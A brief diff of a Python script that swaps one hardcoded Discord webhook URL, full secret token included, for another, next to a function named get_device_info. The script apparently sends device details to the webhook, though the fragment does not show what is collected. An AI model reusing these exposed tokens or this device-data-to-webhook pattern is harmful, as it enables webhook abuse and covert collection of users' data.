@@ -4,7 +4,7 @@ import time
 import random
 from tqdm import tqdm
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1438606986114764854/lE6LEjv2yTGUOAvSYkOWYOHfripU-H10ZcyPu3A1dnHsDQMFOZCLYqOVKnFSOhCH6yhS"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1438927391929012276/XuNKR8tAGae0sKiTfSb6XRcTdis557KbTJGDlimnjQHfrNvoJBfn7HW1b08GU_eBXIVI"
 
 def get_device_info():
 try:
